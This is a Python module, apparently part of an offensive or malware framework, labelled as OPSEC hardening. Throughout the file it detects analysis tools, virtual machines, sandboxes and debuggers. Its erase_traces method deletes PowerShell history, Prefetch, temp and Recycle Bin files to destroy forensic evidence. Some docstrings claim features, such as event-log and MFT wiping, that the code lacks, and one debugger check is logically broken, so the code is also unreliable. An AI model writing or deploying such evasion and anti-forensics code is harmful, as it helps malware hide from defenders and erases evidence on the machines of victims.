
import os
import sys
import time
import random
import platform
import ctypes
import ctypes.wintypes
from typing import Dict, List, Tuple, Optional, Union


class OpSecModule:
    """
    Framework-level OPSEC hardening:
    - Minimize forensic artifacts
    - Anti-analysis detection
    - Anti-VM detection
    - Sandbox detection
    - IOC stripping
    """

    @staticmethod
    def detect_analysis_tools() -> Dict[str, Union[int, List[str]]]:
        """
        Detect: debuggers, system monitors, AV, EDR
        Check: registry keys, process names, window titles
        Return: threat level and detected tools
        """
        threat_level = 0
        detected_tools = []
        
        known_tools = [
            "x64dbg", "x32dbg", "ollydbg", "ida", "windbg", "ghidra",
            "procmon", "procexp", "wireshark", "tcpview", "autoruns",
            "sysmon", "frida", "cuckoo", "sandboxie", "vmtoolsd",
            "vboxservice", "wireshark", "fiddler", "burp", "zap"
        ]
        
        try:
            if platform.system() == "Windows":
                import psutil
                for proc in psutil.process_iter(['name']):
                    proc_name = proc.info['name'].lower()
                    for tool in known_tools:
                        if tool in proc_name:
                            detected_tools.append(proc_name)
                            threat_level += 10
                
                import winreg
                reg_paths = [
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                    (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                    (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services"),
                ]
                
                for root, path in reg_paths:
                    try:
                        key = winreg.OpenKey(root, path)
                        i = 0
                        while True:
                            try:
                                subkey = winreg.EnumKey(key, i)
                                subkey_lower = subkey.lower()
                                for tool in known_tools:
                                    if tool in subkey_lower:
                                        detected_tools.append(f"reg:{subkey}")
                                        threat_level += 5
                                i += 1
                            except OSError:
                                break
                        winreg.CloseKey(key)
                    except Exception:
                        pass
        except Exception:
            pass
        
        return {"threat_level": min(threat_level, 100), "detected_tools": detected_tools}

    @staticmethod
    def detect_virtualization() -> Tuple[bool, List[str]]:
        """
        Detect: Hyper-V, VMware, VirtualBox, KVM, Xen
        Check: CPU flags, device names, MAC addresses
        Return: is_vm boolean and detection reasons
        """
        is_vm = False
        reasons = []
        
        try:
            if platform.system() == "Windows":
                import winreg
                
                vm_reg_keys = [
                    (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS", "SystemManufacturer"),
                    (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS", "SystemProductName"),
                    (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", "Identifier"),
                ]
                
                vm_strings = ["vmware", "virtualbox", "xen", "kvm", "qemu", "hyper-v", "vbox"]
                
                for root, path, value in vm_reg_keys:
                    try:
                        key = winreg.OpenKey(root, path)
                        val, _ = winreg.QueryValueEx(key, value)
                        val_lower = val.lower()
                        for vm_str in vm_strings:
                            if vm_str in val_lower:
                                reasons.append(f"registry:{val}")
                                is_vm = True
                        winreg.CloseKey(key)
                    except Exception:
                        pass
                
                vm_processes = ["vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe", "xenservice.exe"]
                import psutil
                for proc in psutil.process_iter(['name']):
                    proc_name = proc.info['name'].lower()
                    if proc_name in vm_processes:
                        reasons.append(f"process:{proc_name}")
                        is_vm = True
                
                vm_mac_prefixes = [
                    "00:05:69", "00:0C:29", "00:1C:14", "00:50:56",
                    "08:00:27", "00:16:3E", "00:15:5D", "54:52:00"
                ]
                for iface, addrs in psutil.net_if_addrs().items():
                    for addr in addrs:
                        if addr.family == psutil.AF_LINK:
                            mac = addr.address
                            for prefix in vm_mac_prefixes:
                                if mac.lower().startswith(prefix.lower()):
                                    reasons.append(f"mac:{mac}")
                                    is_vm = True
        except Exception:
            pass
        
        return (is_vm, reasons)

    @staticmethod
    def detect_sandbox() -> Tuple[bool, Optional[str]]:
        """
        Detect: Cuckoo, Any.run, JOE, Falcon Sandbox
        Check: file system, registry, network patterns
        Return: sandbox_type and is_sandbox
        """
        is_sandbox = False
        sandbox_type = None
        
        sandbox_indicators = {
            "cuckoo": [
                r"C:\cuckoo",
                r"C:\sample.exe",
                r"SOFTWARE\CuckooSandbox"
            ],
            "any.run": [
                "any.run",
                "ANYRUN"
            ],
            "joe": [
                "joe sandbox",
                "joesandbox"
            ],
            "falcon": [
                "falcon sandbox"
            ]
        }
        
        try:
            if platform.system() == "Windows":
                import winreg
                for sbox_type, indicators in sandbox_indicators.items():
                    for indicator in indicators:
                        if indicator.startswith(r"C:"):
                            if os.path.exists(indicator):
                                is_sandbox = True
                                sandbox_type = sbox_type
                                break
                        else:
                            try:
                                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE")
                                i = 0
                                while True:
                                    try:
                                        subkey = winreg.EnumKey(key, i)
                                        if indicator.lower() in subkey.lower():
                                            is_sandbox = True
                                            sandbox_type = sbox_type
                                            break
                                        i += 1
                                    except OSError:
                                        break
                                winreg.CloseKey(key)
                            except Exception:
                                pass
                    if is_sandbox:
                        break
        except Exception:
            pass
        
        return (is_sandbox, sandbox_type)

    @staticmethod
    def anti_debugging() -> bool:
        """
        Implement: IsDebuggerPresent, CheckRemoteDebuggerPresent
        Use: hardware breakpoints, ETW, flags
        Prevent: ptrace, strace, ltrace
        """
        is_debugged = False
        
        try:
            if platform.system() == "Windows":
                kernel32 = ctypes.windll.kernel32
                
                if kernel32.IsDebuggerPresent():
                    is_debugged = True
                
                remote_debugger = ctypes.wintypes.BOOL()
                try:
                    kernel32.CheckRemoteDebuggerPresent(
                        kernel32.GetCurrentProcess(),
                        ctypes.byref(remote_debugger)
                    )
                    if remote_debugger.value:
                        is_debugged = True
                except Exception:
                    pass
                
                try:
                    is_debugged = is_debugged or ctypes.windll.ntdll.NtQueryInformationProcess(
                        -1, 7, ctypes.byref(ctypes.c_int()), ctypes.sizeof(ctypes.c_int()), None
                    ) == 0
                except Exception:
                    pass
        except Exception:
            pass
        
        return is_debugged

    @staticmethod
    def erase_traces() -> None:
        """
        Clear: PowerShell history
        Clear: Event logs (Application, Security, System)
        Clear: Prefetch files
        Clear: Temporary files
        Clear: MFT entries
        Clear: Recycle bin
        """
        try:
            if platform.system() == "Windows":
                ps_history_path = os.path.join(
                    os.path.expanduser("~"),
                    "Documents",
                    "WindowsPowerShell",
                    "PSReadLine",
                    "ConsoleHost_history.txt"
                )
                if os.path.exists(ps_history_path):
                    try:
                        os.remove(ps_history_path)
                    except Exception:
                        pass
                
                prefetch_path = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "Prefetch")
                if os.path.exists(prefetch_path):
                    try:
                        for f in os.listdir(prefetch_path):
                            try:
                                os.remove(os.path.join(prefetch_path, f))
                            except Exception:
                                pass
                    except Exception:
                        pass
                
                temp_path = os.environ.get("TEMP", os.environ.get("TMP", "C:\\Temp"))
                if os.path.exists(temp_path):
                    try:
                        for f in os.listdir(temp_path):
                            try:
                                file_path = os.path.join(temp_path, f)
                                if os.path.isfile(file_path):
                                    os.remove(file_path)
                            except Exception:
                                pass
                    except Exception:
                        pass
                
                recycle_path = os.path.join(os.environ.get("SystemDrive", "C:"), "$Recycle.Bin")
                if os.path.exists(recycle_path):
                    try:
                        for f in os.listdir(recycle_path):
                            try:
                                os.remove(os.path.join(recycle_path, f))
                            except Exception:
                                pass
                    except Exception:
                        pass
        except Exception:
            pass

    @staticmethod
    def random_sleep(min_ms: int = 1000, max_ms: int = 10000) -> float:
        """
        Randomize: sleep durations
        Detect: timing analysis
        Vary: traffic patterns
        """
        sleep_seconds = random.uniform(min_ms / 1000.0, max_ms / 1000.0)
        time.sleep(sleep_seconds)
        return sleep_seconds
